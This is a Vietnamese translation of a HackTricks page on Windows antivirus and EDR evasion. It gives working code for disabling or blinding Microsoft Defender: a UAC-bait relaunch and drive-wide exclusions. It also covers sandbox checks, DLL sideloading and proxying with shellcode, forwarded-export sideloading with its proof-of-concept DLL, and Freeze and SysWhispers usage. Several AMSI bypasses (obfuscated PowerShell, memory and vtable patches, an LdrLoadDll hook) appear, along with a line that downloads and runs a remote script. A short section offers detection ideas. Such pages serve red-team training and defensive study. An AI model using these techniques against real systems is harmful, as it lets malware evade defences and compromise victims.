# Bỏ qua Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Trang này ban đầu được viết bởi** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Dừng Defender

- [defendnot](https://github.com/es3n1n/defendnot): Công cụ dừng Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Công cụ giả mạo một AV khác để dừng Windows Defender.
- [Tắt Defender nếu bạn là admin](basic-powershell-for-pentesters/README.md)

### Dùng trình cài đặt làm mồi nhử UAC trước khi can thiệp vào Defender

Các loader công khai giả dạng cheat game thường được phát hành dưới dạng trình cài đặt Node.js/Nexe chưa ký; chúng **yêu cầu người dùng cấp quyền nâng cao** rồi mới vô hiệu hóa Defender. Quy trình rất đơn giản:

1. Kiểm tra xem có quyền admin hay không bằng `net session`. Lệnh này chỉ chạy thành công khi người gọi có quyền admin, vì vậy nếu thất bại, loader đang chạy với tư cách người dùng thông thường.
2. Ngay lập tức khởi chạy lại chính nó bằng verb `RunAs` để kích hoạt lời nhắc xác nhận UAC như dự kiến, đồng thời giữ nguyên dòng lệnh ban đầu.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Nạn nhân vốn đã tin rằng họ đang cài phần mềm “cracked”, nên thường chấp nhận lời nhắc, cấp cho malware quyền cần thiết để thay đổi chính sách của Defender.<sup>[[26]](#references)</sup>

### Các ngoại lệ `MpPreference` bao trùm mọi ký tự ổ đĩa

Sau khi có quyền nâng cao, các chuỗi kiểu GachiLoader tối đa hóa những điểm mù của Defender thay vì tắt hẳn dịch vụ. Trình nạp trước tiên diệt tiến trình giám sát của giao diện đồ họa (`taskkill /F /IM SecHealthUI.exe`), sau đó thêm **các ngoại lệ cực kỳ rộng** để mọi hồ sơ người dùng, thư mục hệ thống và ổ đĩa di động đều không thể được quét:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Vòng lặp duyệt qua mọi filesystem đã mount (D:\, E:\, USB stick, v.v.), vì vậy **mọi payload được thả vào bất kỳ đâu trên ổ đĩa trong tương lai đều bị bỏ qua**.
- Việc loại trừ phần mở rộng `.sys` được chuẩn bị cho tương lai—kẻ tấn công giữ lại tùy chọn tải driver chưa ký sau này mà không cần chạm vào Defender lần nữa.
- Mọi thay đổi đều nằm dưới `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, cho phép các giai đoạn sau xác nhận rằng các mục loại trừ vẫn còn hoặc mở rộng chúng mà không kích hoạt lại UAC.

Vì không có dịch vụ Defender nào bị dừng, các kiểm tra tình trạng sơ sài vẫn báo “antivirus active” dù tính năng kiểm tra thời gian thực không bao giờ quét các đường dẫn đó.<sup>[[26]](#references)</sup>

## **Phương pháp né tránh AV**

Hiện nay, AV sử dụng nhiều phương pháp khác nhau để kiểm tra tệp có độc hại hay không: phát hiện tĩnh, phân tích động và, với các EDR tiên tiến hơn, phân tích hành vi.

### **Phát hiện tĩnh**

Phát hiện tĩnh được thực hiện bằng cách đánh dấu các chuỗi hoặc mảng byte độc hại đã biết trong binary hoặc script, đồng thời trích xuất thông tin từ chính tệp đó (ví dụ: mô tả tệp, tên công ty, chữ ký số, icon, checksum, v.v.). Điều này có nghĩa là việc sử dụng các công cụ công khai đã biết có thể khiến bạn dễ bị phát hiện hơn, vì chúng có thể đã được phân tích và đánh dấu là độc hại. Có một số cách để vượt qua kiểu phát hiện này:

- **Mã hóa**

Nếu mã hóa binary, AV sẽ không thể phát hiện chương trình của bạn, nhưng bạn sẽ cần một loại loader nào đó để giải mã và chạy chương trình trong bộ nhớ.

- **Obfuscation**

Đôi khi, bạn chỉ cần thay đổi một số chuỗi trong binary hoặc script để vượt qua AV, nhưng việc này có thể tốn thời gian tùy thuộc vào nội dung bạn muốn obfuscate.

- **Tự phát triển công cụ**

Nếu tự phát triển công cụ, sẽ không có signature độc hại nào đã biết, nhưng việc này tốn rất nhiều thời gian và công sức.

> [!TIP]
> Một cách hay để kiểm tra khả năng phát hiện tĩnh của Windows Defender là dùng [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Công cụ này chia tệp thành nhiều đoạn rồi yêu cầu Defender quét từng đoạn riêng lẻ, nhờ đó có thể cho bạn biết chính xác những chuỗi hoặc byte nào trong binary bị đánh dấu.

Tôi thực sự khuyên bạn xem [playlist YouTube này](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) về AV Evasion thực tiễn.

### Kiểm tra đặc trưng PE ngoại tuyến cho bộ phân loại tĩnh

Các byte payload được pack hoặc mã hóa chỉ là một trong những đầu vào của bộ phân loại tĩnh. EMBER2024 trích xuất các đặc trưng PE, bao gồm imports, exports, sections, headers và dữ liệu Authenticode.<sup>[[48]](#references)</sup> Trong một thử nghiệm với loader, việc thêm 141 imports trông có vẻ vô hại đã làm giảm 93% điểm độc hại của EMBER2024, trong khi các imports gắn với malware làm tăng điểm này. Đây là kết quả của mô hình và các mẫu cụ thể đó, không phải cách đáng tin cậy để vượt qua một sản phẩm AV/EDR cụ thể.<sup>[[50]](#references)</sup>

Đối với thử nghiệm loader được cấp phép, hãy giữ nguyên payload và đường dẫn thực thi, chỉ thay đổi một biến build có chủ đích cho mỗi phiên bản, rồi so sánh điểm số ngoại tuyến. Kiểm tra các đặc trưng PE thu được vì một thay đổi trong build có thể ảnh hưởng đến nhiều nhóm đặc trưng.<sup>[[49]](#references)[[50]](#references)</sup> Để giữ các imports dự kiến trong IAT, hãy gọi các API Win32 đã chọn từ mã có thể được thực thi. Thay đổi lựa chọn và phân bổ các điểm gọi trên nhiều build, thay vì tạo một hàm ngụy trang cố định có thể trở thành signature. Thử nghiệm cũng ghi nhận điểm số thấp hơn khi có chữ ký mã hợp lệ, các export entry và nhiều hàm hơn làm tăng kích thước `.pdata`; chữ ký không hợp lệ hầu như không có tác động, còn ảnh hưởng của `.pdata` là nhỏ.<sup>[[50]](#references)</sup>

Package `thrember` cung cấp khả năng trích xuất đặc trưng và các mô hình benchmark. Sau khi cài đặt, hãy dùng `thrember.download_models("models")` với một thư mục `models` có sẵn, sau đó chạy bộ chấm điểm từ thư mục cha: helper tải xuống sẽ thay đổi thư mục làm việc hiện tại. Bộ phân loại PE có thể chấm điểm một thư mục chứa các build mà không cần gửi chúng đến dịch vụ quét:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Giữ cố định phiên bản model và feature-extractor trong quá trình so sánh. Điểm offline thấp hơn chỉ cho thấy classifier này phản ứng thế nào với binary đã thay đổi; điều đó không chứng minh việc né tránh phân tích hành vi, giả lập hoặc model khác của nhà cung cấp.<sup>[[49]](#references)[[50]](#references)</sup> Xem [polymorphism theo từng bản dựng và ngụy trang binary bên ngoài trong payload được ảo hóa](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) để biết về mô hình thực thi riêng.

### **Phân tích động**

Phân tích động là khi AV chạy binary của bạn trong sandbox và theo dõi hoạt động độc hại (ví dụ: cố giải mã và đọc mật khẩu trình duyệt, tạo minidump từ LSASS, v.v.). Phần này có thể hơi khó xử lý hơn, nhưng sau đây là một số cách bạn có thể dùng để né sandbox.

- **Ngủ trước khi thực thi** Tùy vào cách triển khai, đây có thể là một cách tuyệt vời để vượt qua phân tích động của AV. AV có rất ít thời gian để quét tệp nhằm tránh làm gián đoạn quy trình làm việc của người dùng, vì vậy thời gian ngủ dài có thể gây nhiễu cho quá trình phân tích binary. Vấn đề là nhiều sandbox của AV có thể bỏ qua thời gian ngủ tùy vào cách nó được triển khai.
- **Kiểm tra tài nguyên của máy** Sandbox thường có rất ít tài nguyên để sử dụng (ví dụ: < 2GB RAM), nếu không chúng có thể làm chậm máy của người dùng. Bạn cũng có thể sáng tạo hơn, chẳng hạn kiểm tra nhiệt độ CPU hoặc thậm chí tốc độ quạt; không phải mọi thứ đều được triển khai trong sandbox.
- **Kiểm tra đặc điểm riêng của máy** Nếu bạn muốn nhắm mục tiêu đến người dùng có máy trạm tham gia miền "contoso.local", bạn có thể kiểm tra miền của máy tính để xem có khớp với miền đã chỉ định hay không; nếu không khớp, bạn có thể cho chương trình thoát.

Hóa ra tên máy tính trong Sandbox của Microsoft Defender là HAL9TH, vì vậy bạn có thể kiểm tra tên máy tính trong malware trước khi kích hoạt. Nếu tên khớp với HAL9TH, tức là bạn đang ở trong sandbox của Defender, và bạn có thể cho chương trình thoát.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>nguồn: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Một số mẹo rất hữu ích khác từ [@mgeeky](https://twitter.com/mariuszbit) để đối phó với Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kênh #malware-dev</p></figcaption></figure>

Như đã nói trước đó trong bài viết này, **các công cụ công khai** rồi cũng sẽ **bị phát hiện**, vì vậy bạn nên tự hỏi điều này:

Ví dụ, nếu muốn dump LSASS, **bạn có thực sự cần dùng mimikatz không**? Hay bạn có thể dùng một project khác ít được biết đến hơn nhưng cũng dump được LSASS?

Có lẽ phương án sau mới là câu trả lời đúng. Lấy mimikatz làm ví dụ, đây có lẽ là một trong những malware bị AV và EDR gắn cờ nhiều nhất, nếu không muốn nói là nhiều nhất. Dù bản thân project này rất tuyệt, việc tìm cách vượt qua AV khi dùng nó cũng là một cơn ác mộng, vì vậy hãy tìm các phương án thay thế để đạt được mục tiêu của bạn.

> [!TIP]
> Khi chỉnh sửa payload để né phát hiện, hãy nhớ **tắt tính năng tự động gửi mẫu** trong Defender, và làm ơn, nghiêm túc đấy, **ĐỪNG TẢI LÊN VIRUSTOTAL** nếu mục tiêu của bạn là né phát hiện về lâu dài. Nếu muốn kiểm tra xem một AV cụ thể có phát hiện payload của bạn hay không, hãy cài AV đó trên VM, thử tắt tính năng tự động gửi mẫu, rồi kiểm tra tại đó cho đến khi bạn hài lòng với kết quả.

## EXEs vs DLLs

Khi có thể, hãy luôn **ưu tiên dùng DLL để né phát hiện**; theo kinh nghiệm của tôi, tệp DLL thường **ít bị phát hiện và phân tích hơn nhiều**, vì vậy đây là một mẹo rất đơn giản để tránh bị phát hiện trong một số trường hợp (tất nhiên là nếu payload của bạn có cách chạy dưới dạng DLL).

Như ta có thể thấy trong hình này, DLL Payload từ Havoc có tỷ lệ phát hiện là 4/26 trên antiscan.me, trong khi EXE payload có tỷ lệ phát hiện là 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>so sánh trên antiscan.me giữa một Havoc EXE payload thông thường và một Havoc DLL thông thường</p></figcaption></figure>

Bây giờ, chúng ta sẽ giới thiệu một số mẹo giúp bạn dùng tệp DLL kín đáo hơn nhiều.

## DLL Sideloading & Proxying

**DLL Sideloading** tận dụng thứ tự tìm kiếm DLL mà loader sử dụng bằng cách đặt ứng dụng nạn nhân và payload độc hại cạnh nhau.

Bạn có thể tìm các chương trình dễ bị DLL Sideloading bằng [Siofra](https://github.com/Cybereason/siofra) và script powershell sau:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Lệnh này sẽ xuất danh sách các chương trình trong "C:\Program Files\\" dễ bị DLL hijacking và các file DLL mà chúng cố tải.

Tôi rất khuyến khích bạn **tự tìm hiểu các chương trình có thể bị DLL Hijack/Sideload**, kỹ thuật này khá kín đáo nếu được thực hiện đúng cách, nhưng nếu sử dụng các chương trình DLL Sideload đã được công khai rộng rãi, bạn có thể dễ dàng bị phát hiện.

Chỉ đặt một DLL độc hại có tên mà chương trình dự kiến tải sẽ không khiến payload của bạn được tải, vì chương trình mong đợi một số hàm cụ thể bên trong DLL đó. Để khắc phục vấn đề này, chúng ta sẽ dùng một kỹ thuật khác gọi là **DLL Proxying/Forwarding**.

**DLL Proxying** chuyển tiếp các lời gọi mà chương trình thực hiện từ DLL proxy (độc hại) sang DLL gốc, nhờ đó giữ nguyên chức năng của chương trình và cho phép thực thi payload của bạn.

Tôi sẽ sử dụng dự án [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) của [@flangvik](https://twitter.com/Flangvik/)

Đây là các bước tôi đã thực hiện:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Lệnh cuối cùng sẽ cung cấp cho chúng ta 2 tệp: một mẫu mã nguồn DLL và DLL gốc đã được đổi tên.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Đây là kết quả:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Cả shellcode của chúng ta (được mã hóa bằng [SGN](https://github.com/EgeBalci/sgn)) lẫn proxy DLL đều có tỷ lệ phát hiện 0/26 trên [antiscan.me](https://antiscan.me)! Tôi có thể gọi đây là một thành công.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Tôi **rất khuyến nghị** bạn xem [VOD trên twitch của S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) về DLL Sideloading và cả [video của ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) để tìm hiểu sâu hơn về những gì chúng ta đã thảo luận.

### Lạm dụng Forwarded Exports (ForwardSideLoading)

Các module Windows PE có thể export những hàm thực chất là "forwarder": thay vì trỏ đến mã, mục export chứa một chuỗi ASCII có dạng `TargetDll.TargetFunc`. Khi một caller phân giải export, Windows loader sẽ:

- Tải `TargetDll` nếu chưa được tải
- Phân giải `TargetFunc` từ module đó

Các hành vi quan trọng cần hiểu:
- Nếu `TargetDll` là KnownDLL, nó được cung cấp từ namespace KnownDLLs được bảo vệ (ví dụ: ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Nếu `TargetDll` không phải KnownDLL, thứ tự tìm kiếm DLL thông thường sẽ được sử dụng, bao gồm cả thư mục của module đang thực hiện việc phân giải forward.

Điều này tạo ra một primitive sideloading gián tiếp: tìm một DLL đã ký export một hàm được forward đến tên module không phải KnownDLL, sau đó đặt DLL đã ký đó cùng thư mục với một DLL do attacker kiểm soát có tên chính xác là tên module đích được forward đến. Khi forwarded export được gọi, loader sẽ phân giải forward và tải DLL của bạn từ cùng thư mục, thực thi DllMain của bạn.<sup>[[13]](#references)</sup>

Ví dụ được quan sát trên Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` không phải là KnownDLL, vì vậy nó được phân giải theo thứ tự tìm kiếm thông thường.

PoC (sao chép-dán):
1) Sao chép system DLL đã ký vào một thư mục có quyền ghi
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Đặt một `NCRYPTPROV.dll` độc hại trong cùng thư mục. Chỉ cần một DllMain tối giản để thực thi mã; bạn không cần triển khai hàm được chuyển tiếp để kích hoạt DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Kích hoạt thao tác chuyển tiếp bằng một LOLBin có chữ ký số:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Hành vi quan sát được:
- rundll32 (đã ký) tải `keyiso.dll` side-by-side (đã ký)
- Khi phân giải `KeyIsoSetAuditingInterface`, loader theo forward đến `NCRYPTPROV.SetAuditingInterface`
- Sau đó loader tải `NCRYPTPROV.dll` từ `C:\test` và thực thi `DllMain` của nó
- Nếu `SetAuditingInterface` chưa được triển khai, bạn sẽ nhận được lỗi "missing API" chỉ sau khi `DllMain` đã chạy

Mẹo săn tìm:
- Tập trung vào các export được forward khi module đích không phải là KnownDLL. KnownDLL được liệt kê trong `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Bạn có thể liệt kê các export được forward bằng các công cụ như:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Xem danh sách forwarder của Windows 11 để tìm các ứng viên: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ý tưởng phát hiện/phòng thủ:
- Giám sát LOLBins (ví dụ: rundll32.exe) tải các DLL đã ký từ đường dẫn không thuộc hệ thống, sau đó tải các DLL không phải KnownDLLs có cùng tên cơ sở từ thư mục đó
- Cảnh báo khi phát hiện chuỗi tiến trình/module như: `rundll32.exe` → `keyiso.dll` không thuộc hệ thống → `NCRYPTPROV.dll` nằm trong đường dẫn người dùng có quyền ghi
- Áp dụng chính sách toàn vẹn mã (WDAC/AppLocker) và cấm quyền ghi+thực thi trong các thư mục ứng dụng

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze là bộ công cụ payload dùng để bypass EDR thông qua các tiến trình bị tạm ngưng, direct syscalls và các phương thức thực thi thay thế`

Bạn có thể dùng Freeze để tải và thực thi shellcode một cách kín đáo.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion chỉ là trò chơi mèo vờn chuột: những gì hiệu quả hôm nay có thể bị phát hiện vào ngày mai, vì vậy đừng bao giờ chỉ dựa vào một công cụ; nếu có thể, hãy thử kết hợp nhiều kỹ thuật evasion.

## Syscalls trực tiếp/gián tiếp & phân giải SSN (SysWhispers4)

EDR thường đặt **user-mode inline hook** lên các syscall stub của `ntdll.dll`. Để bypass những hook đó, bạn có thể tạo các syscall stub **trực tiếp** hoặc **gián tiếp** để nạp đúng **SSN** (System Service Number) và chuyển sang kernel mode mà không thực thi entrypoint export đã bị hook.<sup>[[32]](#references)</sup>

**Các tùy chọn gọi:**
- **Direct (embedded)**: phát sinh một lệnh `syscall`/`sysenter`/`SVC #0` trong stub được tạo (không gọi export của `ntdll`).
- **Indirect**: nhảy vào một gadget `syscall` hiện có bên trong `ntdll` để lần chuyển sang kernel có vẻ bắt nguồn từ `ntdll` (hữu ích cho việc né heuristic); **randomized indirect** chọn một gadget từ pool cho mỗi lần gọi.
- **Egg-hunt**: tránh nhúng chuỗi opcode `0F 05` tĩnh vào file trên đĩa; phân giải một chuỗi syscall tại runtime.

**Các chiến lược phân giải SSN chống chịu hook:**
- **FreshyCalls (VA sort)**: suy ra SSN bằng cách sắp xếp syscall stub theo địa chỉ ảo thay vì đọc byte của stub.
- **SyscallsFromDisk**: ánh xạ một `\KnownDlls\ntdll.dll` sạch, đọc SSN từ `.text` của nó, rồi hủy ánh xạ (bypass mọi hook trong bộ nhớ).
- **RecycledGate**: kết hợp suy luận SSN dựa trên VA đã sắp xếp với xác thực opcode khi stub còn sạch; nếu bị hook thì chuyển sang suy luận dựa trên VA.
- **HW Breakpoint**: đặt DR0 lên lệnh `syscall` và dùng VEH để lấy SSN từ `EAX` tại runtime mà không cần phân tích byte đã bị hook.

Ví dụ sử dụng SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI được tạo ra để ngăn chặn "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Ban đầu, AV chỉ có thể quét **các file trên đĩa**, vì vậy nếu có cách nào đó thực thi payload **trực tiếp trong bộ nhớ**, AV sẽ không thể làm gì để ngăn chặn vì không có đủ khả năng quan sát.

Tính năng AMSI được tích hợp vào các thành phần sau của Windows.

- User Account Control, hay UAC (nâng quyền EXE, COM, MSI hoặc cài đặt ActiveX)
- PowerShell (script, sử dụng tương tác và đánh giá mã động)
- Windows Script Host (wscript.exe và cscript.exe)
- JavaScript và VBScript
- Macro Office VBA

Tính năng này cho phép các giải pháp antivirus kiểm tra hành vi của script bằng cách hiển thị nội dung script ở dạng không được mã hóa và không bị làm rối.

Chạy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sẽ tạo cảnh báo sau trên Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Hãy chú ý cách nó thêm tiền tố `amsi:` rồi đến đường dẫn của file thực thi đã chạy script; trong trường hợp này là powershell.exe

Chúng ta không ghi bất kỳ file nào xuống đĩa, nhưng vẫn bị phát hiện trong bộ nhớ do AMSI.

Ngoài ra, từ **.NET 4.8** trở đi, mã C# cũng được quét qua AMSI. Điều này thậm chí ảnh hưởng đến `Assembly.Load(byte[])` khi tải mã để thực thi trong bộ nhớ. Đó là lý do nên dùng các phiên bản .NET thấp hơn (chẳng hạn 4.7.2 trở xuống) để thực thi trong bộ nhớ nếu muốn né AMSI.

Có một vài cách để vượt qua AMSI:

- **Obfuscation**

Vì AMSI chủ yếu hoạt động dựa trên phát hiện tĩnh, nên sửa đổi các script bạn định tải có thể là một cách hiệu quả để né phát hiện.

Tuy nhiên, AMSI có khả năng gỡ rối script ngay cả khi script có nhiều lớp, vì vậy obfuscation có thể là lựa chọn không tốt, tùy thuộc vào cách thực hiện. Điều này khiến việc né phát hiện không hề đơn giản. Dù vậy, đôi khi chỉ cần đổi tên một vài biến là đủ, nên hiệu quả còn tùy vào mức độ một nội dung nào đó bị gắn cờ.

- **AMSI Bypass**

Vì AMSI được triển khai bằng cách tải một DLL vào tiến trình powershell (cũng như cscript.exe, wscript.exe, v.v.), nên có thể dễ dàng can thiệp vào nó ngay cả khi chỉ chạy với quyền người dùng thông thường. Do điểm yếu này trong cách triển khai AMSI, các nhà nghiên cứu đã tìm ra nhiều cách để né việc quét của AMSI.

**Buộc xảy ra lỗi**

Buộc quá trình khởi tạo AMSI thất bại (amsiInitFailed) sẽ khiến tiến trình hiện tại không khởi chạy quá trình quét nào. Cách này ban đầu được [Matt Graeber](https://twitter.com/mattifestation) công bố và Microsoft đã phát triển một signature để ngăn việc sử dụng rộng rãi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Chỉ cần một dòng mã powershell là đủ khiến AMSI không thể sử dụng được trong tiến trình powershell hiện tại. Dĩ nhiên, chính AMSI đã đánh dấu dòng này, nên cần sửa đổi đôi chút để sử dụng kỹ thuật này.

Đây là một cách bypass AMSI đã chỉnh sửa mà tôi lấy từ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind rằng nội dung này có thể sẽ bị gắn cờ sau khi bài viết được đăng, vì vậy bạn không nên công bố bất kỳ code nào nếu muốn tránh bị phát hiện.

**Memory Patching**

Kỹ thuật này ban đầu được phát hiện bởi [@RastaMouse](https://twitter.com/_RastaMouse/). Kỹ thuật này tìm địa chỉ của hàm "AmsiScanBuffer" trong amsi.dll (chịu trách nhiệm quét dữ liệu đầu vào do người dùng cung cấp) rồi ghi đè hàm này bằng các lệnh để trả về mã E_INVALIDARG. Nhờ vậy, kết quả quét thực tế sẽ là 0, được hiểu là kết quả sạch.

> [!TIP]
> Vui lòng đọc [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) để tìm hiểu giải thích chi tiết hơn.

Ngoài ra còn có nhiều kỹ thuật khác dùng để bypass AMSI với powershell. Hãy xem [**trang này**](basic-powershell-for-pentesters/index.html#amsi-bypass) và [**repo này**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) để tìm hiểu thêm.

### AMSI COM scan-pointer redirection thay vì patch `AmsiScanBuffer`

Một bypass khác chỉ tác động trong phạm vi tiến trình, không thay đổi entry point `AmsiScanBuffer`. Trong .NET loader 64-bit được báo cáo, một đối tượng AMSI COM được tạo từ CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` trả về con trỏ interface, và slot vtable tại offset `0x18` được dùng làm đích gọi scan. Loader patch một con trỏ native của `Console.Clear()` bằng một x64 stub ngắn, đổi entry vtable này thành stub bằng `VirtualProtect()`, rồi khôi phục quyền bảo vệ trang ban đầu. Đây là kỹ thuật đòi hỏi độ rộng con trỏ 64-bit và bố cục COM như dự kiến; offset này không dùng chung được cho các interface hoặc bản dựng AMSI tùy ý. Các giai đoạn được quan sát trước đó là [signed AppDomainManager sidecar loading](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) và [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Các byte stub được quan sát là `41 C7 00 01 00 00 00 33 C0 C3`: chúng ghi **1** vào con trỏ kết quả trong `r8` và trả về **0** trong `eax`. Vì vậy, nhận định được báo cáo rằng kết quả scan là `AMSI_RESULT_CLEAN` (0) đã đánh đồng giá trị trả về `S_OK` với enum đầu ra. Theo thứ tự `AMSI_RESULT` được tài liệu hóa, kết quả **1** là `AMSI_RESULT_NOT_DETECTED`; giá trị này vẫn dưới ngưỡng phát hiện.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI chỉ được khởi tạo sau khi `amsi.dll` được tải vào tiến trình hiện tại. Một bypass mạnh mẽ, không phụ thuộc ngôn ngữ, là đặt user-mode hook lên `ntdll!LdrLoadDll` để trả về lỗi khi module được yêu cầu là `amsi.dll`. Nhờ đó, AMSI không bao giờ được tải và tiến trình đó không thực hiện quá trình scan nào.<sup>[[23]](#references)</sup>

Phác thảo cách triển khai (pseudocode x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ghi chú
- Hoạt động với PowerShell, WScript/CScript và các loader tùy chỉnh (bất cứ thứ gì nếu không thì sẽ tải AMSI).
- Kết hợp với việc truyền script qua stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) để tránh để lại dấu vết dài trên dòng lệnh.
